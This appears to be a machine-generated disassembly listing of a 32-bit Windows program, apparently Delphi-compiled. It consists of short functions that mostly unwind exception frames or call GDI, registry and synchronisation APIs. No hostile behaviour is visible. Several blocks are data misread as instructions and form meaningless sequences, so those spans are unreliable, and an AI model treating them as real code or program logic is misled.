jmp sub_405fd0
sub_441cf3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_441d70
jmp sub_405fd0
sub_441d77
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_441fa7
jmp sub_405fd0
sub_44200b
jmp sub_405fd0
sub_442012
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4420ee
jmp sub_405fd0
sub_44213a
jmp sub_405fd0
sub_442141
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_442208
jmp sub_405fd0
sub_44220f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_442228
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0xc ]
mov edx esi
call sub_409ccc
pop esi
pop ebx
retn
sub_4423ac
jmp sub_405fd0
sub_4423dd
jmp sub_405fd0
sub_4423e4
movzx eax [ ebp - 0x11 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4424da
jmp sub_405fd0
sub_442541
jmp sub_405fd0
sub_442548
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44263a
jmp sub_405fd0
sub_4426a1
jmp sub_405fd0
sub_4426a8
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4427ad
jmp sub_405fd0
sub_4427b4
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44289d
jmp sub_405fd0
sub_4428a4
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4428aa
add [ eax ] al
sbb cl [ esi + 0x2e3f991f ]

sub_44297f
jmp sub_405fd0
sub_442986
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44298d
add [ eax ] al
add [ edx ] bl
mov ds [ edi ]
cdq
aas

sub_442997
dec edx
xchg ecx eax
test al 0x4b
xchg ebp eax
xchg [ ebx + 0x408b78a8 ] edi
sbb al 0xc3
sub_4429a4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x20 ]
call sub_4070a8
pop esi
pop ebx
retn
sub_442a59
jmp sub_405fd0
sub_442a60
pop ebp
retn
sub_442b62
jmp sub_405fd0
sub_442b69
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_443250
push sub_4432b0
call GetModuleHandleW
mov [ rw-data ] eax
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_442c3c
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
retn
sub_4432b0
push ebp
add [ ebx ] dl
inc ebp
add [ edx ] dl
xor eax [ eax ]
xor al [ eax ]
add [ cs : eax + eax + 0x4c ] al
add [ eax + eax ] cl
add [ eax ] al
add bh bh
add eax rw-data
retn
sub_44357b
dec [ eax ]
add [ eax ] al
add [ eax + eax + 0x5c ] bl
add [ edi ] bh
add [ eax + eax + 0x55 ] bl
add [ esi ] cl
inc ebx
add [ eax + eax ] bl
add [ eax ] al
add bh bh
add eax rw-data
retn
sub_44362b
jmp sub_405fd0
sub_443632
pop ebp
retn
sub_4436aa
jmp sub_405fd0
sub_4436b1
pop ebp
retn
sub_4439e0
call [ 0x4200443c ]
add ah dh
dec [ ebx + 0x3c ]
inc esp
add [ edx ] al
hlt
sub_443a00
push [ edx ]
cmp eax r-xdata
hlt
sub_443a08
push [ eax + 0x3d ]
inc esp
add [ edx ] al
hlt
sub_443a2b
inc esp
add [ edx ] al
hlt
sub_443a4b
inc esp
add [ edx ] al
hlt
sub_443a6b
inc esp
add [ edx ] al
hlt
sub_443a70
push [ eax + 0x42004440 ]
add ah dh
jmp esi
sub_443ad1
mov esp 0x42004443
add ah dh
push ebp
inc ebx
inc esp
add [ edx ] al
hlt
sub_443af2
inc esp
inc esp
add [ edx ] al
hlt
sub_443b00
push [ ebx + 0x45 ]
inc esp
add [ edx ] al
hlt
sub_4448f7
jmp sub_405fd0
sub_4448fe
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_444a99
jmp sub_405fd0
sub_444aa0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_444ccc
jmp sub_405fd0
sub_444cd3
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_444ded
jmp sub_405fd0
sub_444df4
movzx eax [ ebp - 0x6 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_444fd3
jmp sub_405fd0
sub_444fda
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_445122
jmp sub_405fd0
sub_445173
jmp sub_405fd0
sub_44517a
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_4452cc
jmp sub_405fd0
sub_4452d3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_445540
jmp sub_405fd0
sub_445547
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_445671
jmp sub_405fd0
sub_445678
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4456fd
jmp sub_405fd0
sub_445704
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_445931
jmp sub_405fd0
sub_445938
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_445978
push ecx
mov [ esp ] ecx
push 0x4
push 0x3
lea ecx [ esp + 0x8 ]
call sub_445b80
pop edx
retn
sub_4459bc
and ecx 0x7f
call sub_445978
retn
sub_4459c8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44598c
test eax eax
setne al
pop esi
pop ebx
retn
sub_4459e0
push ebp
mov ebp esp
push 0x8
push 0x4
lea ecx [ ebp + 0x8 ]
call sub_445b80
pop ebp
retn 0x8
sub_445a28
push ebp
mov ebp esp
push 0x8
push 0x4
lea ecx [ ebp + 0x8 ]
call sub_445b80
pop ebp
retn 0x8
sub_445a70
push ebp
mov ebp esp
push 0x8
push 0x4
lea ecx [ ebp + 0x8 ]
call sub_445b80
pop ebp
retn 0x8
sub_445ab8
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_445a70
pop ebp
retn 0x8
sub_445acc
add esp 0xfffffff8
call sub_445a84
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
retn
sub_445ae0
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_445a70
pop ebp
retn 0x8
sub_445af4
add esp 0xfffffff8
call sub_445a84
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
retn
sub_445b08
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x4
call sub_445b80
pop ebx
pop ebp
retn 0x4
sub_445c94
add esp 0xfffffff8
mov ecx esp
call sub_445550
pop ecx
pop edx
retn
sub_445d2a
jmp sub_405fd0
sub_445d31
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_445df7
jmp sub_405fd0
sub_445dfe
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_445e7c
jmp sub_405fd0
sub_445e83
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_445ef0
jmp sub_405fd0
sub_445f94
jmp sub_405fd0
sub_445f9b
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_44600c
jmp sub_405fd0
sub_446085
jmp sub_405fd0
sub_44608c
movzx eax [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_446123
jmp sub_405fd0
sub_446207
jmp sub_405fd0
sub_44620e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_404220
retn
sub_446224
jmp sub_405fd0
sub_446247
jmp sub_405fd0
sub_44624e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_446357
jmp sub_405fd0
sub_44635e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446383
lea eax [ ebp - 0x30 ]
call j_sub_4068a0
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_44637c
jmp sub_405fd0
sub_446383
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_446540
jmp sub_405fd0
sub_446547
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44656a
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x1c ]
call sub_444bf8
retn
sub_446563
jmp sub_405fd0
sub_44656a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call RegCloseKey
retn
sub_446581
jmp sub_405fd0
sub_4465b0
jmp sub_405fd0
sub_4465b7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4465e1
lea eax [ ebp - 0x50 ]
mov edx 0x3
call j_sub_4068c4
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_4465da
jmp sub_405fd0
sub_4465e1
mov esp ebp
pop ebp
retn
sub_4466ac
jmp sub_405fd0
sub_4466ca
jmp sub_405fd0
sub_44674d
jmp sub_405fd0
sub_446754
pop ebp
retn
sub_4474d2
pushfd
0x44
sub_44750c
add [ edx ] al
add [ edx ] al
add [ edi + ebp * 4 - 0x3687ffc0 ] bl
inc esp
add [ eax ] ch
0x44
sub_4476cb
inc esp
add al dh
int3
sub_449f37
push [ ebp + 0x420044a1 ]
add ah dh
jmp ebx
sub_44a77b
jmp [ edi ]
sub_44ab78
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_44ac56
push [ esi + 0x420044ad ]
add ah dh
dec [ edi ]
scasb [ edi ]
inc esp
add [ edx ] al
hlt
sub_44af34
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_44afa8
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_44afb4
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_44b0a8
jmp sub_405fd0
sub_44b0af
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44b153
jmp sub_405fd0
sub_44b201
jmp sub_405fd0
sub_44b208
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44b210
retn
sub_44b282
jmp sub_405fd0
sub_44b289
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44b290
cmp [ edx + 0x1d ] 0x0
je r-xdata
retn
lea eax [ edx + 0x18 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
sub_44b31e
jmp sub_405fd0
sub_44b325
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44b3d3
jmp sub_405fd0
sub_44b3da
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44bb3c
push 0x33
mov ecx rw-data
call sub_42fe18
retn
sub_44bb4c
push 0x33
mov ecx rw-data
call sub_42fdd4
retn
sub_44bb5c
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_44bb80
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_44bb90
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_44bec0
push 0x11
mov ecx rw-data
call sub_42fdd4
retn
sub_44bfcd
jmp sub_405fd0
sub_44bfd4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44c070
push ebx
mov ebx eax
mov eax ebx
call sub_44bb5c
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_44c12a
jmp sub_405fd0
sub_44c131
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_44bb80
retn
sub_44c147
jmp sub_405fd0
sub_44c160
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0x23
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_44c1bd
jmp sub_405fd0
sub_44c1c4
pop ebx
pop ecx
pop ebp
retn
sub_44c3d6
jmp sub_405fd0
sub_44c406
jmp sub_405fd0
sub_44c40d
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44c45c
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_44c4df
jmp sub_405fd0
sub_44c4e6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44c548
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
push eax
push 0x48
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x14 ]
push eax
call MulDiv
neg eax
pop ebx
retn
sub_44c584
mov eax [ eax + 0x10 ]
movzx edx [ eax + 0x1d ]
mov eax edx
retn
sub_44c5d0
mov eax [ eax + 0x10 ]
movzx eax [ eax + 0x1c ]
retn
sub_44c610
mov eax [ eax + 0x10 ]
movzx eax [ eax + 0x1e ]
retn
sub_44c650
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x18 ]
retn
sub_44c762
jmp sub_405fd0
sub_44c8a3
jmp sub_405fd0
sub_44c8aa
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_44bb80
retn
sub_44c8c0
jmp sub_405fd0
sub_44c935
jmp sub_405fd0
sub_44c93c
pop ebx
pop ecx
pop ebp
retn
sub_44c940
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_44ca16
jmp sub_405fd0
sub_44ca4c
cmp dl [ eax + 0x18 ]
je r-xdata
retn
mov [ eax + 0x18 ] dl
mov edx [ eax ]
call [ edx + 0xc ]
sub_44ca5c
mov eax [ eax + 0x10 ]
movzx eax [ eax + 0x1c ]
retn
sub_44ca94
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x18 ]
retn
sub_44cc47
jmp sub_405fd0
sub_44cc4e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_44bb80
retn
sub_44cc64
jmp sub_405fd0
sub_44ccdd
jmp sub_405fd0
sub_44cce4
pop ebx
pop ecx
pop ebp
retn
sub_44cce8
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x18 ]
retn
sub_44cd14
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_44ce5e
jmp sub_405fd0
sub_44ce94
mov eax [ eax + 0x10 ]
movzx eax [ eax + 0x1c ]
retn
sub_44cef4
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_44cf08
push ebx
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_44cf1c
push ebx
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0xc ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx [ edx ]
mov ebx [ eax ]
call [ ebx + 0x48 ]
pop ebx
retn
sub_44cf5c
push ebx
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0xc ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx [ edx ]
mov ebx [ eax ]
call [ ebx + 0x74 ]
pop ebx
retn
sub_44d028
jmp sub_405fd0
sub_44d02f
movzx eax [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_44d038
push ebx
mov ebx eax
lea eax [ ebx + 0x1c ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x34 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_44d43e
jmp sub_405fd0
j_sub_44d411
jmp sub_44d411
sub_44d445
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d467
mov eax [ ebp - 0x8 ]
call sub_451144
call sub_44d038
retn
sub_44d460
jmp sub_405fd0
sub_44d467
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_44d038
retn
sub_44d485
jmp sub_405fd0
sub_44d820
or [ eax ] eax
add [ eax ] al
cmp [ eax + 0x38 ] 0x0
setne al
retn
sub_44dbb5
jmp sub_405fd0
sub_44dbbc
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_44dca5
jmp sub_405fd0
sub_44dcac
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_44de04
jmp sub_405fd0
sub_44de0b
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44de28
mov eax [ eax + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_44de34
mov eax [ eax + 0x48 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_44dfa8
retn
sub_44e14c
push ebx
mov ebx eax
test [ ebx + 0x3c ] 0x2
je r-xdata
pop ebx
retn
and [ ebx + 0x3c ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x38 ]
push eax
call SelectObject
sub_44e16c
push ebx
mov ebx eax
test [ ebx + 0x3c ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x3c ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x38 ]
push eax
call SelectObject
sub_44e18c
push ebx
mov ebx eax
test [ ebx + 0x3c ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x3c ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x38 ]
push eax
call SelectObject
sub_44e1ac
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
pop ebx
retn
sub_44e1c4
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
pop ebx
retn
sub_44e1e8
mov eax [ rw-data ]
call sub_44e1c4
retn
sub_44e23e
jmp sub_405fd0
sub_44e245
pop ecx
pop ebp
retn
sub_44e2e4
jmp sub_405fd0
sub_44e2eb
pop ebx
mov esp ebp
pop ebp
retn
sub_44e3bd
jmp sub_405fd0
sub_44e44e
jmp sub_405fd0
sub_44e455
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44e568
jmp sub_405fd0
sub_44e715
jmp sub_405fd0
sub_44e71c
movzx eax [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_44e935
jmp sub_405fd0
sub_44e93c
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_44e9d6
jmp sub_405fd0
sub_44ebb3
jmp sub_405fd0
sub_44ec6d
jmp sub_405fd0
sub_44ec74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ec94
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
retn
sub_44ec8d
jmp sub_405fd0
sub_44ec94
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44ee19
jmp sub_405fd0
sub_44efee
jmp sub_405fd0
sub_44eff5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f018
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_404220
retn
sub_44f011
jmp sub_405fd0
sub_44f018
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f038
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_404220
retn
sub_44f031
jmp sub_405fd0
sub_44f038
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_44f190
push 0x0
call sub_44f128
retn
sub_44f235
jmp sub_405fd0
sub_44f23c
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_44f24c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_44f198
pop ebx
pop ebp
retn 0x4
sub_44f260
retn
sub_44f264
test eax eax
jne r-xdata
retn
call sub_44f260
sub_44f439
jmp sub_405fd0
sub_44f460
jmp sub_405fd0
sub_44f467
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44f4a8
push ebx
mov [ eax + 0x20 ] 0x1
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_44f690
jmp sub_405fd0
sub_44f697
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4055f0
retn
sub_44f6ad
jmp sub_405fd0
sub_44f6f0
xor eax eax
retn
sub_44f6f4
xor eax eax
retn
sub_44f6f8
movzx eax [ eax + 0x21 ]
retn
sub_44f748
jmp sub_405fd0
sub_44f74f
pop esi
pop ecx
pop ebp
retn
sub_44f780
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x5c ]
pop esi
retn
sub_44f7d7
jmp sub_405fd0
sub_44f7de
pop esi
pop ecx
pop ebp
retn
sub_44f7e4
retn
sub_44f7e8
test dl dl
je r-xdata
mov [ eax + 0x20 ] 0x0
retn
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_44f818
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_44f828
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x60 ]
pop esi
retn
sub_44fa8e
jmp sub_405fd0
sub_44fac0
jmp sub_405fd0
sub_44fac7
mov esp ebp
pop ebp
retn
sub_44fb48
jmp sub_405fd0
sub_44fc56
jmp sub_405fd0
sub_44fd43
jmp sub_405fd0
sub_44fef7
jmp sub_405fd0
sub_4502a8
jmp sub_405fd0
sub_4504f5
jmp sub_405fd0
sub_45051f
jmp sub_405fd0
sub_450526
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450548
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_450541
jmp sub_405fd0
sub_450552
jmp sub_405d1c
sub_4505a1
jmp sub_405fd0
sub_4507cb
jmp sub_405fd0
sub_450813
jmp sub_405fd0
sub_4509af
jmp sub_405fd0
sub_450a78
jmp sub_405d1c
sub_450ad4
mov [ eax + 0x31 ] 0x0
call sub_44f4a8
retn
sub_450d2f
jmp sub_405fd0
sub_450df3
jmp sub_405fd0
sub_450dfa
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_450fdb
jmp sub_405fd0
j_sub_450fb8
jmp sub_450fb8
sub_451096
cmp [ ebp - 0x9 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
call SelectPalette
sub_4510af
jmp sub_405fd0
j_sub_451096
jmp sub_451096
sub_4510b6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_451128
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_4511b0
mov edx [ eax + 0x28 ]
test edx edx
je r-xdata
xor eax eax
retn
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4511f0
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_451200
push ebx
mov ebx eax
mov eax ebx
call sub_4516fc
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_451214
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_451230
push ebx
mov ebx eax
mov eax ebx
call sub_45175c
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_4512c8
mov edx [ eax + 0x28 ]
cmp [ edx + 0x3e ] 0x20
jne r-xdata
xor eax eax
retn
movzx eax [ eax + 0x39 ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_4514ec
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_4515fb
jmp sub_405fd0
sub_4516c3
jmp sub_405d1c
sub_4518f9
jmp sub_405fd0
sub_451900
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_451969
jmp sub_405fd0
sub_451970
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_451a24
jmp sub_405d1c
sub_451a82
jmp sub_405fd0
sub_451a89
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_451e71
jmp sub_405fd0
sub_451e9d
jmp sub_405fd0
sub_451f04
jmp sub_405d1c
sub_451f35
jmp sub_405fd0
sub_451fba
jmp sub_405d1c
sub_451fbf
mov eax [ ebp - 0x38 ]
call sub_4055f0
call sub_406120
call sub_406174
sub_451fd1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451fee
mov eax [ ebp - 0x18 ]
call sub_404220
retn
sub_451fe7
jmp sub_405fd0
sub_45215f
jmp sub_405d1c
sub_4522c4
push ebx
mov ecx [ eax + 0x28 ]
mov ecx [ ecx + 0x1c ]
xchg edx ecx
mov ebx [ eax ]
call [ ebx + 0x6c ]
pop ebx
retn
sub_4522d4
mov ecx [ eax + 0x28 ]
cmp edx [ ecx + 0xc ]
je r-xdata
retn
mov [ ecx + 0xc ] edx
mov [ eax + 0x32 ] 0x1
mov [ eax + 0x31 ] 0x1
sub_4523fc
jmp sub_405d1c
sub_452584
jmp sub_405fd0
sub_45261c
push ebx
mov ecx [ eax + 0x28 ]
mov ecx [ ecx + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x6c ]
pop ebx
retn
sub_45262c
mov cl 0x1
call sub_452634
retn
sub_452922
dec [ ebx + 0x508b2843 ]
or [ ebx + 0x14503bca ] cl
jne r-xdata
xor edx edx
mov [ eax + 0x8 ] edx
mov eax ecx
pop ebx
retn
xor edx edx
mov [ eax + 0x14 ] edx
xor edx edx
mov [ eax + 0x2c ] edx
sub_452944
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x74 ]
mov edx [ ebx + 0x28 ]
xor ecx ecx
mov [ edx + 0xc ] ecx
pop ebx
retn
sub_45297c
xor ecx ecx
call sub_452634
retn
sub_4529fe
jmp sub_405d1c
sub_452a03
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_406120
call sub_406174
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_452a84
cmp [ eax + 0x38 ] 0x1
sete al
retn
sub_452abc
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_452d83
jmp sub_405fd0
sub_452d8a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_404220
retn
sub_452da0
jmp sub_405fd0
sub_452dbd
jmp sub_405fd0
sub_452ef5
add [ eax ] al
add [ ebx + 0x78832840 ] cl
adc al 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov al 0x1
retn
sub_452f24
mov edx [ eax + 0x28 ]
test edx edx
je r-xdata
xor eax eax
retn
cmp [ edx + 0x14 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_453095
jmp sub_405d1c
sub_45318e
jmp sub_405d1c
sub_4531f8
jmp sub_405d1c
sub_4532e5
jmp sub_405fd0
sub_4532fc
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_44e1ac
retn
mov [ eax + 0x30 ] edx
retn
sub_453314
push ebx
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_44e1ac
pop ebx
retn
mov [ eax + 0x2c ] edx
mov [ eax + 0x30 ] ecx
pop ebx
retn
sub_453334
retn
sub_453338
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_44e1ac
retn
